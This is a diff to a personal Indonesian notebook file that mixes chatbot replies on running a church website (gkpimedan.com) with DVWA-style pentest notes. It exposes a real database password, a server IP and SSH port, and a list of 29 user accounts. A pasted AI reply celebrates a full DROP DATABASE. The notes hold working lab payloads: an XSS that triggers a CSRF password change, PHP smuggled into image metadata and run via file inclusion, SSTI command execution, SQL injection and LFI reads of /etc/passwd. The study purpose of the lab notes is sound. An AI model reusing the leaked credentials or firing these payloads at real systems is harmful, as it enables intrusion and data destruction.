@@ -31229,6 +31229,115 @@ $dbname = 'gkpimeda_db';
 $username = 'gkpimeda_superadmin';
 $password = 'XL2its5qrf2wigr';
 
+
+delete database gkpimedan.com:
+Sip — aku **rapikan + rangkum hasil kamu**, biar jelas dan enak dibaca 👇
+
+---
+
+## ✅ Login MySQL sukses
+
+```bash
+mysql -u gkpimeda_superadmin -p
+```
+
+Berhasil masuk:
+
+```
+Welcome to the MySQL monitor.
+Server version: 8.0.44
+```
+
+---
+
+## ✅ Daftar database
+
+```sql
+SHOW DATABASES;
+```
+
+Hasil:
+
+```
++--------------------+
+| Database           |
++--------------------+
+| gkpimeda_db        |
+| information_schema|
+| performance_schema|
++--------------------+
+```
+
+---
+
+## ✅ Masuk database
+
+```sql
+USE gkpimeda_db;
+```
+
+Status:
+
+```
+Database changed
+```
+
+---
+
+## 🔥 Database berhasil dikosongkan total
+
+Kamu menjalankan:
+
+```sql
+DROP DATABASE gkpimeda_db;
+CREATE DATABASE gkpimeda_db;
+```
+
+Hasil:
+
+✅ Semua tabel terhapus
+✅ Semua data bersih
+✅ Database dibuat ulang kosong
+
+Artinya sekarang:
+
+👉 `gkpimeda_db` = DATABASE BARU
+👉 ISI = 0
+👉 Struktur = kosong
+
+Perfect clean 👍
+
+---
+
+# 🧠 Catatan penting
+
+Sekarang kemungkinan:
+
+### ✅ Website / aplikasi error
+
+karena:
+
+* tabel belum ada
+* perlu import ulang `.sql` backup
+
+Kalau kamu punya file backup:
+
+```bash
+mysql -u gkpimeda_superadmin -p gkpimeda_db < backup.sql
+```
+
+---
+
+Kalau mau, next step aku bisa bantu:
+
+✅ restore database
+✅ cek tabel
+✅ cek user privilege
+✅ connect PHP ke database
+✅ debugging error web
+
+tinggal bilang 😎
+
 logo
 Informasi akun hosting
 Paket Hosting Super 3.0 - ID
@@ -78715,7 +78824,7 @@ Berikut adalah 100 terminologi yang dikelompokkan berdasarkan fase dan jenis ser
 100. **Honeypot**: Sistem jebakan yang dirancang untuk menarik dan mempelajari gerak-gerik penyerang.
 
 Ingin saya mendalami salah satu terminologi di atas, misalnya bagaimana cara mencegah **RCE** pada server PHP yang sedang Anda kembangkan?
-cybersecurity
+cybersecurity1
 nmap → untuk mengecek port terbuka dan layanan apa saja yang jalan di server
 
 whois → untuk melihat informasi pemilik domain atau IP (registrar, negara, dll)
@@ -78730,6 +78839,15 @@ kalilinux
 cara cek path suatu web:
 dirsearch example.com 
 sublist3r
+
+OSI Layer,Nama,Deskripsi
+7,Application,Interaksi manusia dan komputer melalui aplikasi yang terhubung ke jaringan.
+6,Presentation,"Memastikan data dalam format yang siap digunakan, enkripsi data, kompresi data."
+5,Session,"Menjaga koneksi tetap terhubung, mengontrol port dan sesi koneksi."
+4,Transport,Mentransmisikan data menggunakan protokol.
+3,Network,Memilih jalur yang digunakan untuk mentransmisikan data.
+2,Data Link,Mendefinisikan format data dalam jaringan.
+1,Physical,"Mentransmisikan data dalam bentuk 0 dan 1 secara fisik (kabel, gelombang, cahaya, dll.)"
 
 
 xss dom:
@@ -78765,10 +78883,18 @@ burpsuite
 pas mau intercept pake browser dari burpsuite dia td sempat eror ternyata krn  ada local server jalan di xampp jd harus di matikan dulu
 
 
+
+
 attack vector pake exiftool
 exiftool -Comment="$(cat payload.js)" image.jpg
 
+csrf attack:
+http://localhost/vulnerabilities/xss_d/?default=<img%20src=x%20onerror=alert(1)>
 
+dan klo kena validasi pake ini:
+Cross-Site Scripting (XSS) yang memicu serangan Cross-Site Request Forgery (CSRF) secara otomatis.
+
+URL Lengkap: localhost/vulnerabilities/xss_r/?name=<ScRiPt>new Image().src="http://localhost/vulnerabilities/csrf/?password_new=test2&password_conf=test2&Change=Change"</ScRiPt>
 
 sqlinjection
 ' union select 1,2#
@@ -78848,8 +78974,357 @@ vulnfile.php
  exiftool -DocumentName="<?php phpinfo(); ?>" ucing.jpg
 
 
+setelah itu untuk akses phpinfo untuk dieksekusi, cukup panggil path url ke ucing.jpg yg telah di susupi
+pake file inclusion 
 
+http://localhost/vulnerabilities/fi/?page=../../hackable/uploads/cuplikan.png
 
 
 
  
+🧠 training CTF / practice / lab (DVWA, PicoCTF practice, HTB Academy, PortSwigger lab, VulnHub, dll)
+
+
+
+
+SSTI : sama dgn rce
+http://127.0.0.1:9999/ssti?data={{config}}
+http://127.0.0.1:9999/ssti?data={{namespace.__init__.__globals__.os.popen("whoami").read()}}
+
+
+///////////////////////////////////////////////////////////
+////////////////////LAPORAN BUGBOUNTY//////////////////////////////////
+//////////////////////////////////////////////////////////
+
+Siap 👍
+Kita **fokus ke yang di gambar itu saja (CVSS Base Score v3.1)** dan aku tentukan **pakai 1 contoh kasus nyata** biar jelas.
+
+---
+
+## 🎯 Contoh Kasus
+
+**Kerentanan:**
+👉 **SQL Injection pada halaman login web**
+
+* Bisa diakses dari internet
+* Tidak perlu login
+* Tidak perlu klik apa pun
+* Bisa baca & ubah data database
+
+---
+
+## 🧮 Penentuan CVSS Base Metrics
+
+### 1️⃣ Attack Vector (AV)
+
+**Network (N)**
+📌 Karena bisa diserang lewat internet / browser
+➡️ **AV:N**
+
+---
+
+### 2️⃣ Attack Complexity (AC)
+
+**Low (L)**
+📌 Tidak perlu kondisi khusus (race, config aneh, dll)
+➡️ **AC:L**
+
+---
+
+### 3️⃣ Privileges Required (PR)
+
+**None (N)**
+📌 Penyerang belum login tapi sudah bisa exploit
+➡️ **PR:N**
+
+---
+
+### 4️⃣ User Interaction (UI)
+
+**None (N)**
+📌 Korban tidak perlu klik link / buka apa pun
+➡️ **UI:N**
+
+---
+
+### 5️⃣ Scope (S)
+
+**Unchanged (U)**
+📌 Dampak masih di aplikasi itu sendiri
+➡️ **S:U**
+
+---
+
+### 6️⃣ Confidentiality (C)
+
+**High (H)**
+📌 Bisa baca seluruh data user (email, password hash, dll)
+➡️ **C:H**
+
+---
+
+### 7️⃣ Integrity (I)
+
+**High (H)**
+📌 Bisa ubah / hapus data di database
+➡️ **I:H**
+
+---
+
+### 8️⃣ Availability (A)
+
+**High (H)**
+📌 Bisa hapus tabel → aplikasi down
+➡️ **A:H**
+
+---
+
+## 📌 Ringkasan Nilai
+
+| Metric | Nilai         |
+| ------ | ------------- |
+| AV     | Network (N)   |
+| AC     | Low (L)       |
+| PR     | None (N)      |
+| UI     | None (N)      |
+| S      | Unchanged (U) |
+| C      | High (H)      |
+| I      | High (H)      |
+| A      | High (H)      |
+
+---
+
+## 🔗 Vector String
+
+```
+CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+```
+
+---
+
+## 🚨 Hasil Skor
+
+👉 **Base Score: 9.8 (CRITICAL)**
+
+---
+
+## 🧠 Cara berpikir cepat (biar gampang nentuin)
+
+* Bisa dari internet? → **AV:N**
+* Gampang diexploit? → **AC:L**
+* Tanpa login? → **PR:N**
+* Tanpa klik korban? → **UI:N**
+* Data bocor besar? → **C:H**
+* Data bisa diubah? → **I:H**
+* Bisa bikin down? → **A:H**
+
+---
+
+Kalau mau, aku bisa:
+
+* bikin **contoh lain** (XSS, IDOR, File Upload)
+* bantu **nilai kasus portal kamu sendiri**
+* atau bikin **versi tabel laporan pentest**
+
+Tinggal bilang 👍
+Siap 👍
+Ini aku rapikan dan **benarkan sebagai hasil akhir tabel reporting yang layak laporan pentest** (bahasa formal + teknis, tanpa langkah eksploit).
+
+---
+
+## 📋 Hasil Akhir – Vulnerability Reporting
+
+| Field           | Keterangan                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
+| --------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **Finding**     | SQL Injection                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
+| **Risk Rating** | **Critical (9.8)**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
+| **CVSS**        | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
+| **Description** | SQL Injection merupakan kerentanan keamanan yang memungkinkan penyerang menyisipkan perintah SQL berbahaya ke dalam input aplikasi. Kerentanan ini dapat menyebabkan manipulasi query database sehingga penyerang berpotensi membaca, mengubah, atau menghapus data sensitif, serta berdampak pada kerahasiaan, integritas, dan ketersediaan sistem. Pada aplikasi ini, kerentanan ditemukan pada fitur dengan endpoint `http://XXXX.com/getdata?id=` yang tidak melakukan validasi dan sanitasi input secara memadai, sehingga memungkinkan terjadinya injeksi SQL. |
+
+---
+
+## 🧠 Kenapa dinilai **Critical (9.8)**?
+
+* **AV:N** → Bisa diakses via internet
+* **AC:L** → Mudah dieksploitasi
+* **PR:N** → Tidak perlu login
+* **UI:N** → Tanpa interaksi user
+* **C/I/A:H** → Dampak penuh ke data & sistem
+
+---
+
+## 📌 Catatan Profesional (opsional ditambahkan di laporan)
+
+* CVSS dihitung berdasarkan **worst reasonable case**
+* Skor digunakan untuk **prioritas remediasi**, bukan satu-satunya penilaian risiko
+
+---
+
+Kalau kamu mau, aku bisa:
+
+* tambahkan **Impact**, **Recommendation**, dan **Mitigation**
+* sesuaikan bahasanya ke **laporan kampus / bug bounty / perusahaan**
+* buat **versi PDF / Word-ready**
+* atau samakan format dengan **OWASP / ISO 27001**
+
+Tinggal bilang mau lanjut bagian mana 👌
+
+
+///////////////////////////////////////////////////////////
+////////////////////LAPORAN BUGBOUNTY//////////////////////////////////
+//////////////////////////////////////////////////////////
+
+moltbot agent ai
+
+
+Berdasarkan gambar yang Anda unggah, berikut adalah salinan teks dari pertanyaan dan jawaban mengenai keamanan siber dan pengujian penetrasi (*penetration testing*):
+
+---
+
+### **Daftar Pertanyaan dan Jawaban Keamanan Siber**
+
+1. **Pertanyaan:** Dalam mengumpulkan informasi berupa informasi dari pemilik service, perintah yang dapat kita gunakan yaitu?
+**Jawab:** `whois`
+2. **Pertanyaan:** Dalam melakukan scanning terhadap sebuah domain `https://example.com`, bagaimana penulisan yang harus kita gunakan pada nmap?
+**Jawab:** `nmap example.com`
+3. **Pertanyaan:** Cara melakukan bypass terhadap validasi `str_replace` dengan string "script" terhadap string input pada XSS yaitu dengan code?
+**Jawab:** `<ScRipT>alert(1)</ScRipT>`
+4. **Pertanyaan:** Bagaimana payload query yang harus kita masukkan dalam menjalankan SQL Injection time-based?
+**Jawab:** `' and sleep(5)#`
+5. **Pertanyaan:** Bagaimana query yang harus kita masukkan dalam menjalankan SQL Injection dengan aturan output hanyalah 1 data teratas?
+**Jawab:** `' or 1 limit 1#`
+6. **Pertanyaan:** Melakukan command injection tanpa menggunakan operator `|` dan `&` yaitu dengan cara?
+**Jawab:** `; {command}`
+7. **Pertanyaan:** Menyisipkan sebuah script PHP berikut: `<?php phpinfo() ?>` dengan menggunakan Exiftool, bagaimana command yang harus dijalankan?
+**Jawab:** `exiftool -DocumentName="<?php phpinfo() ?>" ucing.jpg`
+8. **Pertanyaan:** Code atau payload yang dapat digunakan untuk menarik informasi konfigurasi pada fitur yang memiliki celah SSTI yaitu?
+**Jawab:** `{{config}}`
+Pertanyaan: Untuk melihat isi file dari passwd pada directory etc, salah satu payload yang dapat digunakan pada celah LFI yaitu? Jawab: ../../../../../../etc/passwd
+
+Pertanyaan: Schema yang dapat digunakan untuk mengambil isi file /etc/passwd pada LFI yaitu? Jawab: file
+---
+ 
+
+
+
+ \\wsl.localhost\kali-linux\home\pcsk9\jemaat-02-Februari-v2
+
+itu lokasi file yg mau di upload dan di extrak ke ssh.
+
+
+
+/////////gkpiMEDAN.COM////////////////////////////////////////////////////////////////////////////////////
+//////// ///EKSTRAK PUBLIC HTML LAMA DAN SIMPAN KE LOKAL + DEPLOY YG BARU //////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////
+
+
+Oke, aku paham.
+Tujuan kamu **jelas dan aman**:
+
+> 🔁 **Ganti isi `public_html` di server dengan versi baru**
+> 📦 **Isi lama `public_html` dibackup dulu (di server), lalu bisa kamu tarik ke lokal**
+> 📂 **Lokasi backup tetap di path yang sama (home user server)**
+
+Aku jawab **langsung ke langkah teknis, urut, minim omong**.
+
+---
+
+# ✅ STRATEGI AMAN (BEST PRACTICE)
+
+1. **Backup `public_html` lama → ZIP**
+2. **Kosongkan `public_html`**
+3. **Upload ZIP baru**
+4. **Extract ZIP baru ke `public_html`**
+5. (Opsional) **Download backup lama ke lokal**
+
+---
+
+# 🔹 LANGKAH 1 — BACKUP `public_html` LAMA (WAJIB)
+
+Di **SSH server**:
+
+```bash
+cd ~
+zip -r public_html_backup_before_replace_$(date +%F).zip public_html
+```
+KELUAR SSH LANGSUNG SCP:
+scp -P 64000 gkpimeda@36.50.77.63:public_html_backup_before_replace_2026-02-03.zip .
+
+Cek:
+
+```bash
+ls -lh public_html_backup_before_replace_*.zip
+```
+
+✅ Aman — versi lama **tidak hilang**
+
+---
+
+# 🔹 LANGKAH 2 — KOSONGKAN `public_html`
+
+```bash
+cd ~/public_html
+rm -rf *
+```
+
+⚠️ Pastikan kamu **di `public_html`**, bukan di `/`
+
+Cek:
+
+```bash
+pwd
+```
+
+Harus:
+
+```
+/home/gkpimeda/public_html
+```
+
+---
+ 
+
+/////////////////////////////////////////////////////////////////////////////////////////////
+//////// ///EKSTRAK PUBLIC HTML LAMA DAN SIMPAN KE LOKAL + DEPLOY YG BARU //////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////
+
+
+
+👥 Database Users
+Total Users: 29
+ID	Username	Role	Super Admin	Church	Neighborhood ID	Created	Last Seen
+1	pendeta	superadmin	-	GKPI MEDAN KOTA	-	2025-10-11	2026-01-20 11:18
+2	sekretaris	admin	-	GKPI MEDAN KOTA	-	2025-10-11	2025-10-17 08:28
+3	bendahara	regular	-	GKPI MEDAN KOTA	-	2025-10-11	2025-10-16 16:23
+4	ketua	superadmin	-	GKPI MEDAN KOTA	-	2025-10-11	2025-10-16 16:23
+5	superadmin	pengelola_lingkungan	-	GKPI MEDAN KOTA	-	2025-10-11	2026-02-02 23:52
+12	pendeta_jakarta	pengelola_lingkungan	-	GKPI MEDAN KOTA	-	2025-10-11	2025-10-16 16:23
+15	ketua_medan	superadmin	-	GKPI MEDAN KOTA	-	2025-10-11	2025-10-16 16:23
+16	super_padang_bulan	pengelola_lingkungan	-	GKPI Padang Bulan	-	2025-10-11	2025-10-16 16:23
+17	super_siantar	pengelola_lingkungan	-	GKPI Pem. Siantar	-	2025-10-11	2025-10-16 16:23
+18	super_tebing_tinggi	pengelola_lingkungan	-	GKPI Tebing Tinggi	-	2025-10-11	2025-10-16 16:23
+19	super_jakarta	pengelola_lingkungan	-	GKPI JAKARTA	-	2025-10-11	2025-10-16 16:23
+20	super_bandung	pengelola_lingkungan	-	GKPI Bandung	-	2025-10-11	2025-10-16 16:23
+21	super_surabaya	pengelola_lingkungan	-	GKPI Surabaya	-	2025-10-11	2025-10-16 16:23
+23	admin_sriwijaya	superadmin	-	GKPI MEDAN KOTA	-	2025-10-16	2026-02-03 16:32
+25	admin@medanbaru01	admin	-	GKPI MEDAN KOTA	-	2025-11-13	2025-11-13 08:30
+26	admin@josua	admin	-	GKPI MEDAN KOTA	-	2025-11-13	2025-11-13 08:38
+27	admin@medanbaru02	admin	-	GKPI MEDAN KOTA	-	2025-11-13	2025-11-13 09:21
+28	admin@medanbaru03	admin	-	GKPI MEDAN KOTA	-	2025-11-13	2025-11-13 09:22
+29	admin@medanbaru04	admin	-	GKPI MEDAN KOTA	-	2025-11-13	2025-11-13 09:23
+30	admin@medanbaru05	admin	-	GKPI MEDAN KOTA	-	2025-11-13	2025-11-13 09:25
+31	admin@medanbaru06	admin	-	GKPI MEDAN KOTA	-	2025-11-13	2025-11-13 09:26
+32	admin@mk12danmt	admin	-	GKPI MEDAN KOTA	-	2025-11-13	2025-11-13 09:27
+33	admin@kpanggrung	admin	-	GKPI MEDAN KOTA	-	2025-11-13	2025-11-13 09:29
+34	admin@jatiulupolonia	admin	-	GKPI MEDAN KOTA	-	2025-11-13	2025-11-13 09:31
+35	admin@seigalang	admin	-	GKPI MEDAN KOTA	-	2025-11-13	2025-11-13 09:32
+36	admin@petisahdarat	admin	-	GKPI MEDAN KOTA	-	2025-11-13	2025-11-13 09:34
+37	admin@setiabuditanjungsari	admin	-	GKPI MEDAN KOTA	-	2025-11-13	2025-11-13 10:34
+38	admin@sekipsilalas	admin	-	GKPI MEDAN KOTA	-	2025-11-13	2025-11-13 09:37
+39	admin@poukputrihijau	admin	-	GKPI MEDAN KOTA	-	2025-11-13	2025-11-13 09:38
+
+← Back to Home
+
+
+
+
